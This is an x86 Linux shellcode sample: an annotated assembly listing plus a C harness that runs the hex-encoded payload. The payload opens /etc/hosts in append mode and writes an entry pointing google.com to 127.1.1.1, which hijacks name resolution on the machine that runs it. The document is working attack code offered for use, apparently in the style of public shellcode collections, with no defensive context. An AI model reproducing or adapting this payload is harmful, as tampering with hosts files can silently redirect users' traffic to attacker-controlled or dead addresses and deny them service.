/**

;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1
;author Javier Tejedor
;date 24/09/2014

global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	mov al, 0x5
	push ecx
	push 0x7374736f		;/etc///hosts
	push 0x682f2f2f
	push 0x6374652f
	mov ebx, esp
	mov cx, 0x401 		;permmisions
	int 0x80		;syscall to open file

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data	;jmp-call-pop technique to load the map

_write:
	pop ecx
	push 20			;length of the string, dont forget to modify if changes the map
	pop edx
	int 0x80		;syscall to write in the file

	push 0x6
	pop eax
	int 0x80		;syscall to close the file

	push 0x1
	pop eax
	int 0x80		;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"
**/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}